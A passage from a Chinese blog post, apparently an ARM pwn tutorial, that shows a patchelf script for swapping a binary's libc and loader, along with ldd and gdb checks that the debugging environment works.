class="line">    <span class="variable">$patchelf_bin_path</span> --replace-needed libc.so.6 <span class="variable">$libc_path</span>/libc-[2].[0-9][0-9].so <span class="variable">$elf_path</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="built_in">set</span> +x</span><br></pre></td></tr></table></figure><p>这里的*patchelf_bin_path=”/home/ubuntu/patchelf/src/patchelf”*路径需要师傅们自行更改为自己patchelf的路径，<strong>注意不是文件夹是文件夹里的文件</strong>。</p><p>将该脚本命名为chlibc.sh</p><p>添加可执行权限</p><p>使用该脚本</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">./chlibc.sh /home/ubuntu/glibc-all-in-one/libs/2.31-0ubuntu9.2_arm64 channel </span><br></pre></td></tr></table></figure><p>第二个路径是你<strong>libc文件夹</strong>的位置，最后是你文件的位置，这样就实现了对文件的patch，改变了文件的ld和libc</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210717134856774.png" alt="patch"></p><p>使用ldd验证一下</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210717134809674.png" alt="验证"></p><p>可以发现没有任何问题</p><h2 id="调试验证"><a href="#调试验证" class="headerlink" title="调试验证"></a>调试验证</h2><p>我们用gdb调试一下看看</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210717134953976.png" alt="heap可行"></p><p>这样完成调试，显示heap</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210717135015786.png" alt="bins可行"></p><p>也可以正常显示bins，这样就完成了我们的环境搭建了。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这是我的第一篇博客啦，有写的有问题的地方还望各位师傅斧正。上面的操作基本可以实现在arm架构下的脚本写exp并调试，如果觉得自带的vim不够方便的话还可以使用远程编辑exp，这个会在日后更新的。这里是本人的一点拙见，希望我写的东西能对你有一丝丝的帮助，感谢每个观看该文章的师傅。</p>]]></content>
      
      
      <categories>
          
          <category> Pwn </category>
          
          <category> Armpwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
            <tag> Arm </tag>
            
            <tag> Iot </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
